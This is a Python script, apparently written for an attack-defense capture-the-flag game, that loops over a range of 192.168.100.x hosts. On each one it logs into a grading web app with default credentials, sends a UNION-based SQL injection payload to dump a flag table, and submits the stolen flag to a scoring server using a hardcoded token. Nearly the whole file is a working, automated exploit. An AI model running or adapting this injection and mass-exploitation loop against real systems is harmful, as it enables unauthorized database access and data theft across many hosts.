import requests
import json
import os
import re
import time

ip_pre = "192.168.100."
fail = ""

flag = {"flag": ""}
headers = {"Content-Type": "application/json",
"Authorization": "aa59cbb070f753956f33229a9f511791"}

while True:
    fail = ""
    for i in range(101, 171):
        if i == 105:
            continue
        ip = ip_pre + str(i)
        try:
            session=requests.session()
            ret=session.get("http://%s:48180/ScorePrj/servlet/LoginServlet?account=001&password=001&identity=teacher"%ip,timeout=5)
            ret=session.get("http://%s:48180/ScorePrj/teachers/setscore.jsp?couno=001' UNION ALL SELECT CONCAT(0x7171627871,IFNULL(CAST(flag AS CHAR),0x20),0x71716a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM sport.flagTbl-- -&action=queryscore"%ip,timeout=5)
            temp = re.findall(r"hctf\{(.+?)\}", ret.text)[-1].encode()
            flag["flag"] = "hctf{" + temp + "}"
            flag_post = json.dumps(flag)
            r = requests.post("http://10.8.0.1:19999/api/flag", headers=headers, data=flag_post)
            print(ip + "\t" + str(flag) + "\t" + r.text)
            # os.system()
            # curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: aa59cbb070f753956f33229a9f511791" -d "{ \"flag\": \"your_flag_here\" }"
        except:
            fail = fail + ip + '\n'

    print(fail)